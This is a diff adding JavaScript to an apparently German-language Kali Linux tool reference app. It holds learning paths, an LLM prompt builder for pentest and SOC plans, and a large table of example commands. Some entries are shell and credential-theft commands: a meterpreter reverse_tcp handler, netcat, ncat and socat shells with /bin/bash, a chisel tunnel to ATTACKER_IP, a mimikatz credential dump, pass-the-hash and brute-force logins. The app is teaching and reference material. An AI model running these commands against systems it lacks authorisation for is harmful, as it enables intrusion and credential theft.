+    id: 'web-security', icon:'🌐', name:'Web App Security', duration:'3 Wochen',
+    desc:'OWASP Top 10 verstehen und praktisch testen. Vom Recon zum Exploit.',
+    weeks: [
+      {title:'Woche 1: Recon & Enumeration', goal:'Subdomain-Finding, Directory-Brute-Force, Fingerprinting.', tools:['nmap','gobuster','ffuf','wpscan'], done:false},
+      {title:'Woche 2: Injection & Auth', goal:'SQLi, XSS, Auth-Bypass praktisch üben.', tools:['sqlmap','burpsuite','nuclei'], done:false},
+      {title:'Woche 3: Advanced Web Hacking', goal:'SSRF, XXE, Race Conditions, Business Logic.', tools:['burpsuite','ffuf','nuclei'], done:false},
+    ]
+  },
+  {
+    id: 'forensics-fundamentals', icon:'🔬', name:'Forensik Fundamentals', duration:'2 Wochen',
+    desc:'Digitale Forensik: Disk-Imaging, Memory-Analyse, File-Recovery.',
+    weeks: [
+      {title:'Woche 1: Disk & File Forensics', goal:'Images erstellen, gelöschte Dateien recoveren, Timestamps.', tools:['autopsy','sleuthkit','foremost','testdisk'], done:false},
+      {title:'Woche 2: Memory & Network Forensics', goal:'RAM-Dumps analysieren, Paket-Captures verstehen.', tools:['volatility','wireshark','binwalk'], done:false},
+    ]
+  }
+];
+
+const PATH_PROGRESS_KEY = 'kali-path-progress';
+
+function loadPathProgress() {
+  try { return JSON.parse(localStorage.getItem(PATH_PROGRESS_KEY) || '{}'); }
+  catch(e) { return {}; }
+}
+function savePathProgress(data) {
+  try { localStorage.setItem(PATH_PROGRESS_KEY, JSON.stringify(data)); }
+  catch(e) {}
+}
+
+function renderLearningPaths() {
+  const grid = document.getElementById('paths-grid');
+  if (!grid) return;
+  const progress = loadPathProgress();
+  grid.innerHTML = learningPaths.map(path => {
+    const weeks = path.weeks.map((w, i) => {
+      const key = `${path.id}-${i}`;
+      const done = progress[key] || false;
+      return { ...w, done, key };
+    });
+    const doneCount = weeks.filter(w => w.done).length;
+    const pct = Math.round((doneCount / weeks.length) * 100);
+    return `
+      <div class="path-card" data-path="${path.id}">
+        <div class="path-icon">${path.icon}</div>
+        <div class="path-name">${path.name}</div>
+        <div class="path-desc">${path.desc}</div>
+        <div class="path-progress-bar"><div class="path-progress-fill" style="width:${pct}%"></div></div>
+        <div class="path-progress-text">${doneCount}/${weeks.length} Wochen · ${pct}% · ${path.duration}</div>
+        <div class="path-weeks">
+          ${weeks.map(w => `
+            <div class="path-week">
+              <div class="path-week-header">
+                <span class="path-week-title">${w.title}</span>
+                <input type="checkbox" class="path-week-check" data-key="${w.key}" ${w.done ? 'checked' : ''}>
+              </div>
+              <div class="path-week-goal">${w.goal}</div>
+              <div class="path-week-tools">${w.tools.map(t => `<span class="path-week-tool">${t}</span>`).join('')}</div>
+            </div>
+          `).join('')}
+          ${pct > 0 ? `<button class="path-reset" data-reset="${path.id}">\u21BA Fortschritt zur\u00FCcksetzen</button>` : ''}
+        </div>
+      </div>
+    `;
+  }).join('');
+}
+
+function togglePathWeek(key, checked) {
+  const progress = loadPathProgress();
+  progress[key] = checked;
+  savePathProgress(progress);
+  renderLearningPaths();
+}
+
+function resetPath(pathId) {
+  const progress = loadPathProgress();
+  learningPaths.find(p => p.id === pathId)?.weeks.forEach((_, i) => {
+    delete progress[`${pathId}-${i}`];
+  });
+  savePathProgress(progress);
+  renderLearningPaths();
+}
+
+// Event wiring — Path card click (toggle expand), week checkbox, reset button
+document.addEventListener('click', (e) => {
+  // Reset button — handle first so click doesn't bubble to card
+  const resetBtn = e.target.closest('.path-reset');
+  if (resetBtn) {
+    e.stopPropagation();
+    resetPath(resetBtn.dataset.reset);
+    return;
+  }
+  // Skip if clicking a checkbox or a tool chip (don't bubble to card toggle)
+  if (e.target.closest('.path-week-check, .path-week-tool, .path-reset')) return;
+  const card = e.target.closest('.path-card');
+  if (card) {
+    // Close other open cards
+    document.querySelectorAll('.path-card.active').forEach(c => {
+      if (c !== card) c.classList.remove('active');
+    });
+    card.classList.toggle('active');
+  }
+});
+document.addEventListener('change', (e) => {
+  if (e.target.classList.contains('path-week-check')) {
+    togglePathWeek(e.target.dataset.key, e.target.checked);
+  }
+});
+
+// ═══ LLM PROMPT BUILDER ═══
+const promptTemplates = {
+  pentest: {
+    icon:'⚔️', name:'Pentest Plan', desc:'Offensive Security Assessment',
+    role:'Du bist ein erfahrener Penetration Tester (OSCP-zertifiziert).',
+    task:'Erstelle einen strukturierten Pentest-Plan für folgendes Ziel: {TARGET}.\nBerücksichtige dabei die folgenden Tools und erkläre, wie jedes Tool in den Workflow passt.',
+    output:'Strukturiere deine Antwort in Phasen: Recon → Enumeration → Exploitation → Post-Exploitation. Gib konkrete Commands mit Erklärungen.'
+  },
+  soc: {
+    icon:'👁️', name:'SOC Analyse', desc:'Defensive Monitoring Setup',
+    role:'Du bist ein Senior SOC Analyst mit Expertise in Threat Detection.',
+    task:'Erstelle einen Monitoring-Plan für folgendes Szenario: {TARGET}.\nErkläre, wie die folgenden Tools zur Bedrohungserkennung eingesetzt werden.',
+    output:'Beschreibe für jedes Tool: Was wird überwacht? Welche Alerts sind kritisch? Wie sieht die Incident-Response aus?'
+  },
+  incident: {
+    icon:'🚨', name:'Incident Response', desc:'Vorfall-Analyse & Triage',
+    role:'Du bist ein Incident Response Specialist nach dem NIST IR Framework.',
+    task:'Ein Vorfall wurde gemeldet: {TARGET}.\nErstelle eine IR-Triage mit den folgenden Tools. Was ist die Reihenfolge der Untersuchung?',
+    output:'Folge den NIST IR Phasen: Preparation → Detection → Containment → Eradication → Recovery. Gib konkrete Commands und zu erwartende Ergebnisse.'
+  },
+  learning: {
+    icon:'📚', name:'Lern-Guide', desc:'Tool-Tutorial erstellen',
+    role:'Du bist ein Cybersecurity-Trainer, der komplexe Themen einfach erklärt.',
+    task:'Erstelle einen strukturierten Lern-Guide für die folgenden Tools im Kontext von: {TARGET}.\nErkläre für Anfänger verständlich.',
+    output:'Pro Tool: 1) Was macht es? 2) Wann nutzt man es? 3) Konkrete Beispiele 4) Häufige Fallstricke. Nutze Analogien für schwierige Konzepte.'
+  }
+};
+
+let activePromptTemplate = 'pentest';
+let selectedPromptTools = new Set();
+let promptTarget = '';
+
+function buildPrompt() {
+  const tpl = promptTemplates[activePromptTemplate];
+  if (!tpl) return '';
+  const tools = [...selectedPromptTools].map(id => {
+    const tool = getAllTools().find(t => t.id === id);
+    return tool ? `- **${tool.name}**: ${tool.desc}\n  Command: \`${tool.cmd}\`\n  Tags: ${tool.tags.join(', ')}` : null;
+  }).filter(Boolean).join('\n');
+  const targetText = promptTarget || '[Ziel/Szenario bitte spezifizieren]';
+  return `${tpl.role}
+
+## Aufgabe
+${tpl.task.replace('{TARGET}', targetText)}
+
+## Verfügbare Tools
+${tools}
+
+## Gewünschtes Output-Format
+${tpl.output}`;
+}
+
+function renderPromptModal() {
+  const modal = document.getElementById('prompt-modal-content');
+  const allTools = getAllTools();
+  modal.innerHTML = `
+    <div class="prompt-header">
+      <div class="prompt-title">🤖 LLM Prompt Builder</div>
+      <button class="prompt-close" id="prompt-close">×</button>
+    </div>
+    <div class="prompt-body">
+      <div class="prompt-section">
+        <label class="prompt-label">Template wählen</label>
+        <div class="prompt-templates" id="prompt-templates">
+          ${Object.entries(promptTemplates).map(([k,t]) => `
+            <button class="prompt-template ${k === activePromptTemplate ? 'active' : ''}" data-template="${k}">
+              <div class="prompt-template-icon">${t.icon}</div>
+              <div class="prompt-template-name">${t.name}</div>
+              <div class="prompt-template-desc">${t.desc}</div>
+            </button>
+          `).join('')}
+        </div>
+      </div>
+      <div class="prompt-section">
+        <label class="prompt-label">Ziel / Szenario</label>
+        <input type="text" class="prompt-target" id="prompt-target" placeholder="z.B. Eine interne Netzwerk-Infrastruktur mit Windows AD" value="${promptTarget.replace(/"/g, '&quot;')}">
+      </div>
+      <div class="prompt-section">
+        <label class="prompt-label">Tools auswählen (${selectedPromptTools.size} ausgewählt)</label>
+        <div class="prompt-tool-select" id="prompt-tools">
+          ${allTools.map(t => `<span class="prompt-tool-chip ${selectedPromptTools.has(t.id) ? 'selected' : ''}" data-tool="${t.id}">${t.name}</span>`).join('')}
+        </div>
+        <div style="margin-top:8px;display:flex;gap:8px">
+          <button class="prompt-btn-secondary" id="prompt-select-favs" style="padding:6px 12px;font-size:.75rem">★ Favoriten laden</button>
+          <button class="prompt-btn-secondary" id="prompt-clear-tools" style="padding:6px 12px;font-size:.75rem">Leeren</button>
+        </div>
+      </div>
+      <div class="prompt-section">
+        <label class="prompt-label">Generierter Prompt</label>
+        <div class="prompt-output" id="prompt-output">${buildPrompt().replace(/</g,'&lt;')}</div>
+      </div>
+      <div class="prompt-actions">
+        <button class="prompt-btn prompt-btn-primary" id="prompt-copy">📋 Prompt kopieren</button>
+        <button class="prompt-btn prompt-btn-secondary" id="prompt-download">⬇ Als Markdown</button>
+      </div>
+    </div>
+  `;
+  // Wire template selection
+  document.getElementById('prompt-templates').addEventListener('click', (e) => {
+    const tpl = e.target.closest('.prompt-template');
+    if (!tpl) return;
+    activePromptTemplate = tpl.dataset.template;
+    document.querySelectorAll('.prompt-template').forEach(t => t.classList.toggle('active', t === tpl));
+    document.getElementById('prompt-output').textContent = buildPrompt();
+  });
+  // Wire target input
+  document.getElementById('prompt-target').addEventListener('input', (e) => {
+    promptTarget = e.target.value;
+    document.getElementById('prompt-output').textContent = buildPrompt();
+  });
+  // Wire tool chips
+  document.getElementById('prompt-tools').addEventListener('click', (e) => {
+    const chip = e.target.closest('.prompt-tool-chip');
+    if (!chip) return;
+    const id = chip.dataset.tool;
+    if (selectedPromptTools.has(id)) selectedPromptTools.delete(id);
+    else selectedPromptTools.add(id);
+    chip.classList.toggle('selected');
+    const labels = document.querySelectorAll('.prompt-label');
+    if (labels[2]) labels[2].textContent = `Tools auswählen (${selectedPromptTools.size} ausgewählt)`;
+    document.getElementById('prompt-output').textContent = buildPrompt();
+  });
+  // Load favorites
+  document.getElementById('prompt-select-favs').addEventListener('click', () => {
+    selectedPromptTools = new Set(favorites);
+    renderPromptModal();
+  });
+  // Clear tools
+  document.getElementById('prompt-clear-tools').addEventListener('click', () => {
+    selectedPromptTools.clear();
+    renderPromptModal();
+  });
+  // Copy prompt
+  document.getElementById('prompt-copy').addEventListener('click', () => {
+    navigator.clipboard.writeText(buildPrompt()).then(() => {
+      const btn = document.getElementById('prompt-copy');
+      const orig = btn.textContent;
+      btn.textContent = '✅ Kopiert!';
+      setTimeout(() => btn.textContent = orig, 1500);
+    });
+  });
+  // Download as MD
+  document.getElementById('prompt-download').addEventListener('click', () => {
+    const blob = new Blob([buildPrompt()], {type:'text/markdown'});
+    const a = document.createElement('a');
+    a.href = URL.createObjectURL(blob);
+    a.download = 'kali-llm-prompt.md';
+    a.click();
+  });
+}
+
+// Tool example commands — top tools only, others fall back to base cmd
+const toolExamples = {
+  nmap: [
+    {cmd:'nmap -sV -sC target.com', desc:'Service + Default Script Scan'},
+    {cmd:'nmap -p- --min-rate 1000 target.com', desc:'Full Port Range, Fast'},
+    {cmd:'nmap -A -T4 target.com', desc:'Aggressive Scan'},
+  ],
+  sqlmap: [
+    {cmd:'sqlmap -u "http://target.com/?id=1" --dbs', desc:'Enumerate Databases'},
+    {cmd:'sqlmap -r request.txt --batch --level=5 --risk=3', desc:'POST Request, Max Depth'},
+    {cmd:'sqlmap -u URL --os-shell', desc:'Try OS Shell via SQLi'},
+  ],
+  burpsuite: [
+    {cmd:'burpsuite', desc:'Start GUI Proxy'},
+    {cmd:'java -jar burpsuite_community.jar', desc:'Headless Launch'},
+  ],
+  metasploit: [
+    {cmd:'msfconsole', desc:'Start msfconsole'},
+    {cmd:'msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; exploit"', desc:'Quick Handler'},
+  ],
+  john: [
+    {cmd:'john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt', desc:'Crack with RockYou'},
+    {cmd:'john --format=NT --show hash.txt', desc:'Show Cracked NT Hashes'},
+  ],
+  hashcat: [
+    {cmd:'hashcat -m 0 -a 0 hash.txt rockyou.txt', desc:'MD5, Straight Wordlist'},
+    {cmd:'hashcat -m 1000 -a 3 hash.txt ?a?a?a?a?a?a', desc:'NTLM, Brute Force'},
+    {cmd:'hashcat -m 1800 -a 0 hash.txt rockyou.txt', desc:'sha512crypt'},
+  ],
+  hydra: [
+    {cmd:'hydra -L users.txt -P pass.txt ssh://target', desc:'SSH Brute Force'},
+    {cmd:'hydra -l admin -P rockyou.txt target http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"', desc:'HTTP Form Login'},
+  ],
+  wifite: [
+    {cmd:'wifite --kill', desc:'Auto Attack All Networks'},
+    {cmd:'wifite -e "TargetSSID" --dict rockyou.txt', desc:'Target Single Network'},
+  ],
+  aircrack: [
+    {cmd:'aircrack-ng -w rockyou.txt capture.cap', desc:'Crack WPA Handshake'},
+    {cmd:'aircrack-ng -b AA:BB:CC:DD:EE:FF -w rockyou.txt capture.cap', desc:'Target Specific BSSID'},
+  ],
+  gobuster: [
+    {cmd:'gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt', desc:'Directory Bruteforce'},
+    {cmd:'gobuster dns -d target.com -w subdomains.txt', desc:'DNS Subdomain Enum'},
+  ],
+  ffuf: [
+    {cmd:'ffuf -u http://target.com/FUZZ -w wordlist.txt', desc:'Directory Fuzz'},
+    {cmd:'ffuf -u http://target.com -H "Host: FUZZ.target.com" -w subdomains.txt', desc:'Virtual Host Fuzz'},
+  ],
+  nikto: [
+    {cmd:'nikto -h http://target.com', desc:'Basic Web Scan'},
+    {cmd:'nikto -h target.com -p 80,443 -Tuning 9', desc:'Tuning 9 (SQLi Focus)'},
+  ],
+  nuclei: [
+    {cmd:'nuclei -u http://target.com', desc:'Run All Templates'},
+    {cmd:'nuclei -u target.com -t cves/ -severity high,critical', desc:'CVE High+Critical Only'},
+  ],
+  wpscan: [
+    {cmd:'wpscan --url http://target.com', desc:'WordPress Scan'},
+    {cmd:'wpscan --url target.com --enumerate u,p,t --passwords rockyou.txt', desc:'User + Plugin + Password Brute'},
+  ],
+  masscan: [
+    {cmd:'masscan -p1-65535 10.0.0.0/8 --rate=10000', desc:'Full Internet Sweep'},
+    {cmd:'masscan -p80,443 192.168.0.0/16 --rate=1000', desc:'Common Ports, /16'},
+  ],
+  recon: [
+    {cmd:'recon-ng -w target_corp', desc:'Start Workspace'},
+  ],
+  wireshark: [
+    {cmd:'wireshark -i eth0 -k', desc:'Capture on eth0'},
+    {cmd:'wireshark -r capture.pcap', desc:'Open Capture File'},
+  ],
+  tshark: [
+    {cmd:'tshark -i eth0 -w out.pcap', desc:'CLI Capture'},
+    {cmd:'tshark -r capture.pcap -Y "http.request"', desc:'Filter HTTP Requests'},
+  ],
+  netcat: [
+    {cmd:'nc -lvnp 4444', desc:'Listen for Reverse Shell'},
+    {cmd:'nc target.com 80', desc:'Connect to Port 80'},
+  ],
+  curl: [
+    {cmd:'curl -I https://target.com', desc:'Headers Only'},
+    {cmd:'curl -X POST -d "data" https://target.com/api', desc:'POST Request'},
+    {cmd:'curl -s https://target.com | jq .', desc:'Pretty JSON'},
+  ],
+  wget: [
+    {cmd:'wget -r -np https://target.com/', desc:'Recursive Mirror'},
+    {cmd:'wget --mirror --convert-links https://target.com', desc:'Full Mirror'},
+  ],
+  ssh: [
+    {cmd:'ssh -i key.pem user@target.com', desc:'Login with Key'},
+    {cmd:'ssh -L 8080:localhost:80 user@target', desc:'Local Port Forward'},
+    {cmd:'ssh -D 1080 user@target', desc:'SOCKS Dynamic Proxy'},
+  ],
+  scp: [
+    {cmd:'scp file.txt user@target:/tmp/', desc:'Copy File to Remote'},
+    {cmd:'scp -r dir/ user@target:/var/www/', desc:'Recursive Copy'},
+  ],
+  ncat: [
+    {cmd:'ncat -lvnp 4444 -e /bin/bash', desc:'Bind Shell'},
+    {cmd:'ncat target 4444 --ssl', desc:'Encrypted Reverse Shell'},
+  ],
+  socat: [
+    {cmd:'socat TCP-LISTEN:4444,fork TCP:target:80', desc:'TCP Forwarder'},
+    {cmd:'socat TCP:target.com:80 EXEC:/bin/bash', desc:'Remote Shell via Socat'},
+  ],
+  ping: [
+    {cmd:'ping -c 4 target.com', desc:'Basic Connectivity'},
+    {cmd:'ping -R -c 4 target.com', desc:'Record Route'},
+  ],
+  dig: [
+    {cmd:'dig target.com ANY', desc:'All DNS Records'},
+    {cmd:'dig axfr @ns1.target.com target.com', desc:'Zone Transfer Attempt'},
+  ],
+  nslookup: [
+    {cmd:'nslookup -type=any target.com', desc:'All Records'},
+    {cmd:'nslookup target.com 8.8.8.8', desc:'Use Specific DNS Server'},
+  ],
+  traceroute: [
+    {cmd:'traceroute target.com', desc:'UDP Trace'},
+    {cmd:'traceroute -T -p 443 target.com', desc:'TCP/443 Trace'},
+  ],
+  whois: [
+    {cmd:'whois target.com', desc:'Domain Lookup'},
+    {cmd:'whois 192.168.1.1', desc:'IP Lookup'},
+  ],
+  theHarvester: [
+    {cmd:'theHarvester -d target.com -b all', desc:'All Sources'},
+    {cmd:'theHarvester -d target.com -l 500 -b google,linkedin', desc:'Limit 500, 2 Sources'},
+  ],
+  amass: [
+    {cmd:'amass enum -d target.com', desc:'Passive + Active Enum'},
+    {cmd:'amass enum -active -d target.com -o results.txt', desc:'Active Recon Only'},
+  ],
+  subfinder: [
+    {cmd:'subfinder -d target.com -o subs.txt', desc:'Find Subdomains'},
+    {cmd:'subfinder -d target.com -silent -all', desc:'All Sources, Silent'},
+  ],
+  dnsenum: [
+    {cmd:'dnsenum target.com', desc:'Full Enum'},
+    {cmd:'dnsenum --enum target.com -f subdomains.txt', desc:'Brute Subdomains'},
+  ],
+  dnsx: [
+    {cmd:'dnsx -l subs.txt -resp', desc:'Resolve Subdomain List'},
+    {cmd:'dnsx -d target.com -w subdomains.txt -aaaa', desc:'Brute + AAAA Records'},
+  ],
+  httpx: [
+    {cmd:'httpx -l hosts.txt -status-code -title', desc:'Probe HTTP Hosts'},
+    {cmd:'httpx -u https://target.com -tech-detect', desc:'Detect Tech Stack'},
+  ],
+  wapiti: [
+    {cmd:'wapiti -u http://target.com', desc:'Web Vuln Scan'},
+  ],
+  zap: [
+    {cmd:'zaproxy -daemon', desc:'Start ZAP Daemon'},
+    {cmd:'zap-baseline.py -t http://target.com', desc:'Quick Baseline Scan'},
+  ],
+  dirb: [
+    {cmd:'dirb http://target.com', desc:'Default Wordlist'},
+    {cmd:'dirb http://target.com /usr/share/wordlists/dirb/big.txt', desc:'Big Wordlist'},
+  ],
+  dirsearch: [
+    {cmd:'dirsearch -u http://target.com', desc:'Default Scan'},
+  ],
+  crunch: [
+    {cmd:'crunch 6 8 -o wordlist.txt', desc:'6-8 Char All Printable'},
+    {cmd:'crunch 8 8 -t pass%%%% -o pw.txt', desc:'Pattern pass????'},
+  ],
+  cewl: [
+    {cmd:'cewl http://target.com -w wordlist.txt', desc:'Custom Wordlist from Site'},
+    {cmd:'cewl -d 3 -m 5 http://target.com', desc:'Depth 3, Min Length 5'},
+  ],
+  mimikatz: [
+    {cmd:'mimikatz.exe', desc:'Start Interactive'},
+    {cmd:'mimikatz "privilege::debug" "sekurlsa::logonpasswords"', desc:'Dump Creds'},
+  ],
+  evilwinrm: [
+    {cmd:'evil-winrm -i target -u admin -p Password123', desc:'Login + Password'},
+    {cmd:'evil-winrm -i target -u admin -H NTHASH', desc:'Pass-the-Hash'},
+  ],
+  chisel: [
+    {cmd:'chisel server -p 8000 --reverse', desc:'Start Reverse Server'},
+    {cmd:'chisel client ATTACKER_IP:8000 R:socks', desc:'Reverse SOCKS Proxy'},
+  ],
+  powershellempire: [
+    {cmd:'powershell-empire', desc:'Start Empire C2'},
+  ],
+  crackmapexec: [
+    {cmd:'crackmapexec smb 192.168.1.0/24 -u admin -p Password123', desc:'SMB Auth Check'},
+    {cmd:'crackmapexec smb target -u user -H NTHASH --local-auth', desc:'Pass-the-Hash'},
+  ],
+  bloodhound: [
+    {cmd:'bloodhound', desc:'Start GUI'},
+    {cmd:'bloodhound-python -u user@domain -p Password123 -d domain.com', desc:'Headless Collector'},
+  ],
+  kismet: [
+    {cmd:'kismet', desc:'Start Capture'},
+  ],
+  reaver: [
+    {cmd:'reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv', desc:'WPS Attack'},
+  ],
+  // Purple / Defensive
+  suricata: [
+    {cmd:'suricata -c /etc/suricata/suricata.yaml -i eth0', desc:'Live IDS Mode'},
+    {cmd:'suricata -r capture.pcap -k none', desc:'PCAP Analysis'},
+  ],
+  zeek: [
+    {cmd:'zeek -i eth0', desc:'Live Capture'},
+    {cmd:'zeek -r capture.pcap', desc:'Offline Analysis'},
+  ],
+  arkime: [
+    {cmd:'systemctl start arkime', desc:'Start Arkime Service'},
+  ],
+  wazuh: [
+    {cmd:'/var/ossec/bin/wazuh-control start', desc:'Start Wazuh Manager'},
+    {cmd:'/var/ossec/bin/manage_agents -l', desc:'List Agents'},
+  ],
+  osquery: [
+    {cmd:'osqueryi', desc:'Interactive Shell'},
+    {cmd:'osqueryd --config_path=/etc/osquery/osquery.conf', desc:'Start Daemon'},
+  ],
+  yara: [
+    {cmd:'yara -r rules.yar /path/to/scan', desc:'Scan Directory Recursive'},
+    {cmd:'yara -w rules.yar malware.exe', desc:'Scan with Warnings'},
+  ],
+  falco: [
+    {cmd:'falco', desc:'Run with Default Rules'},
+    {cmd:'falco -r custom_rules.yaml', desc:'Custom Rules File'},
+  ],
+  ufw: [
+    {cmd:'ufw allow 22/tcp', desc:'Allow SSH'},
+    {cmd:'ufw deny 23', desc:'Block Telnet'},
+    {cmd:'ufw enable', desc:'Activate Firewall'},
+  ],
+  iptables: [
+    {cmd:'iptables -L -n -v', desc:'List Rules Verbose'},
+    {cmd:'iptables -A INPUT -p tcp --dport 22 -j ACCEPT', desc:'Allow SSH'},
+  ],
+  nft: [
+    {cmd:'nft list ruleset', desc:'Show All Rules'},
+    {cmd:'nft add rule inet filter input tcp dport 22 accept', desc:'Allow SSH'},
+  ],
+  fail2ban: [
+    {cmd:'fail2ban-client status', desc:'Show All Jails'},
+    {cmd:'fail2ban-client status sshd', desc:'SSH Jail Status'},
+  ],
+  apparmor: [
+    {cmd:'aa-status', desc:'Show Loaded Profiles'},
+    {cmd:'aa-enforce /etc/apparmor.d/usr.bin.firefox', desc:'Enforce Profile'},
+  ],
+  selinux: [
+    {cmd:'sestatus', desc:'Show Status'},
+    {cmd:'setenforce 1', desc:'Enable Enforcing'},
+  ],
+  openssh: [
+    {cmd:'ssh-keygen -t ed25519 -f ~/.ssh/id_ed25519', desc:'Generate Key'},
+    {cmd:'ssh-copy-id user@target', desc:'Push Pubkey'},
+  ],
+  certbot: [
+    {cmd:'certbot --nginx -d example.com', desc:'Issue + Configure Nginx'},
+    {cmd:'certbot renew --dry-run', desc:'Test Renewal'},
+  ],
+  openvpn: [
+    {cmd:'openvpn --config client.ovpn', desc:'Connect VPN'},
+  ],
+  wireguard: [
+    {cmd:'wg-quick up wg0', desc:'Bring Up Interface'},
+    {cmd:'wg show', desc:'Show Handshakes'},
+  ],
+  clamav: [
+    {cmd:'clamscan -r /home/', desc:'Scan Home Recursive'},
+    {cmd:'freshclam', desc:'Update Signatures'},
+  ],
+  chkrootkit: [
+    {cmd:'chkrootkit', desc:'Run Scan'},
+  ],
+  rkhunter: [
+    {cmd:'rkhunter --check --sk', desc:'Check (Skip Keypress)'},
+  ],
+  thehive: [
+    {cmd:'systemctl start thehive', desc:'Start TheHive'},
+  ],
+  cortex: [
+    {cmd:'systemctl start cortex', desc:'Start Cortex'},
+  ],
+  velociraptor: [
+    {cmd:'velociraptor gui', desc:'Start GUI Frontend'},
+    {cmd:'velociraptor client --config client.config.yaml', desc:'Start Client'},
+  ],
+  grr: [
+    {cmd:'/usr/sbin/grr_clientd --config=/etc/grr/grr_client.yaml', desc:'Start GRR Client'},
+  ],
+  cyberchef: [
+    {cmd:'node cyberchef.html', desc:'Serve Locally'},
+  ],
+  openvas: [
+    {cmd:'openvas-start', desc:'Start OpenVAS Services'},
+    {cmd:'gvm-start', desc:'Start GVM Stack'},
+  ],
+  gvm: [
+    {cmd:'gvm-start', desc:'Start GVM'},
+    {cmd:'gvm-check-setup', desc:'Verify Setup'},
+  ],
+  legion: [
+    {cmd:'legion', desc:'Start GUI'},
+  ],
+  openvassd: [
+    {cmd:'openvassd', desc:'Start Scanner Daemon'},
+  ],
+  autopsy: [
+    {cmd:'autopsy', desc:'Start GUI'},
+  ],
+  sleuthkit: [
+    {cmd:'fls -r image.dd', desc:'List Files Recursive'},
+    {cmd:'icat image.dd 12345', desc:'Extract Inode Data'},
+  ],
+  volatility: [
+    {cmd:'volatility -f mem.dmp imageinfo', desc:'Identify Image Profile'},
+    {cmd:'volatility -f mem.dmp --profile=Win7SP1x64 pslist', desc:'List Processes'},
+  ],
+  foremost: [
+    {cmd:'foremost -i image.dd -o output/', desc:'Carve Files'},
+    {cmd:'foremost -t pdf,jpg -i image.dd', desc:'Carve Specific Types'},
+  ],
+  photorec: [
+    {cmd:'photorec /d output/ image.dd', desc:'Recover Files'},
+  ],
+  binwalk: [
+    {cmd:'binwalk firmware.bin', desc:'Scan Firmware'},
+    {cmd:'binwalk -e firmware.bin', desc:'Extract Embedded Files'},
+  ],
+  testdisk: [
+    {cmd:'testdisk image.dd', desc:'Recover Partitions'},
+  ],
+  dd: [
+    {cmd:'dd if=/dev/sda of=disk.img bs=4M status=progress', desc:'Disk → Image'},
+    {cmd:'dd if=disk.img of=/dev/sdb bs=4M status=progress', desc:'Image → Disk'},
+  ],
+  dcfldd: [
+    {cmd:'dcfldd if=/dev/sda of=disk.dd bs=4M hash=sha256', desc:'Forensic Image + Hash'},
+  ],
+  clonezilla: [
+    {cmd:'clonezilla', desc:'Start Live Image Tool'},
+  ],
+  borgbackup: [
+    {cmd:'borg init --encryption=repokey /backup/repo', desc:'Init Repo'},
+    {cmd:'borg create /backup/repo::Monday-$(date +%F) /home', desc:'Create Archive'},
+  ],
+  rsync: [
+    {cmd:'rsync -avz /src/ user@target:/dst/', desc:'Sync Local → Remote'},
+    {cmd:'rsync -avz --delete /src/ /backup/', desc:'Mirror w/ Delete'},
+  ],
+  hashdeep: [
+    {cmd:'hashdeep -r /evidence/ > baseline.txt', desc:'Compute Baseline Hashes'},
+    {cmd:'hashdeep -a -k baseline.txt -r /evidence/', desc:'Audit vs Baseline'},
+  ],
+  exiftool: [
+    {cmd:'exiftool image.jpg', desc:'Read Metadata'},
+    {cmd:'exiftool -all= image.jpg', desc:'Strip Metadata'},
+  ],
+  steghide: [
+    {cmd:'steghide extract -sf image.jpg', desc:'Extract Hidden Data'},
+    {cmd:'steghide info image.jpg', desc:'Show Info'},
+  ],
+  tcpdump: [
+    {cmd:'tcpdump -i eth0 -w capture.pcap', desc:'Capture to File'},
+    {cmd:'tcpdump -i eth0 port 80', desc:'Filter Port 80'},
+  ],
+  snort: [
+    {cmd:'snort -A console -q -u snort -g snort -c /etc/snort/snort.conf -i eth0', desc:'IDS Live Mode'},
+    {cmd:'snort -r capture.pcap -c /etc/snort/snort.conf -A console', desc:'PCAP Replay'},
+  ],
+  logwatch: [
+    {cmd:'logwatch --detail High --range today', desc:'Daily High Detail'},
+  ],
+  auditd: [
+    {cmd:'auditctl -w /etc/passwd -p wa -k passwd_changes', desc:'Watch File'},
+    {cmd:'ausearch -k passwd_changes', desc:'Search Audit Log'},
+  ],
+  aide: [
+    {cmd:'aide --init', desc:'Init Baseline DB'},
+    {cmd:'aide --check', desc:'Run Check'},
+  ],
+};
+
+// Aliases — tool DB uses canonical IDs (with dashes / -ng suffix) but historical keys differ.
+// Map mismatched keys to the existing entries so showToolDetail lookups succeed.
+toolExamples['aircrack-ng'] = toolExamples['aircrack'];
+toolExamples['evil-winrm'] = toolExamples['evilwinrm'];
+toolExamples['powershell-empire'] = toolExamples['powershellempire'];
+toolExamples['recon-ng'] = toolExamples['recon'];
+
+// ═══ COMMAND BUILDER FLAGS ═══
+// Interactive flag toggles for top 15 tools — live command preview
+const toolFlags = {
+  nmap: {
+    target: {label:'Ziel', type:'text', default:'scanme.nmap.org', placeholder:'IP oder Hostname'},
+    flags: [
+      {id:'sV', prefix:'-sV ', label:'Service Detection', desc:'-sV — Services und Versionen erkennen', default:true},
+      {id:'sC', prefix:'-sC ', label:'Default Scripts', desc:'-sC — NSE Default Scripts ausführen', default:false},
+      {id:'p-', prefix:'-p- ', label:'Alle Ports', desc:'-p- — Alle 65535 Ports scannen', default:false},
+      {id:'A', prefix:'-A ', label:'Aggressive', desc:'-A — OS + Service + Scripts + Traceroute', default:false},
+      {id:'T4', prefix:'-T4 ', label:'Fast Timing', desc:'-T4 — Aggressives Timing Template', default:true},
+      {id:'O', prefix:'-O ', label:'OS Detection', desc:'-O — Betriebssystem erkennen', default:false},
+      {id:'sn', prefix:'-sn ', label:'Ping Scan Only', desc:'-sn — Host Discovery ohne Port-Scan', default:false},
+      {id:'min-rate', prefix:'--min-rate 1000 ', label:'Min Rate 1000', desc:'--min-rate 1000 — Mindestens 1000 Pkte/s', default:false},
+    ]
+  },
+  sqlmap: {
+    target: {label:'URL', type:'text', default:'', placeholder:'http://target.com/page?id=1'},
+    flags: [
+      {id:'u', prefix:'-u ', label:'URL (SET TARGET)', desc:'-u URL — Ziel-URL', default:true},
+      {id:'batch', prefix:'--batch ', label:'Batch Mode', desc:'--batch — Keine interaktiven Fragen', default:true},
+      {id:'dbs', prefix:'--dbs ', label:'Enumerate DBs', desc:'--dbs — Datenbanken auflisten', default:false},
+      {id:'tables', prefix:'--tables ', label:'Enumerate Tables', desc:'--tables -D db — Tabellen auflisten', default:false},
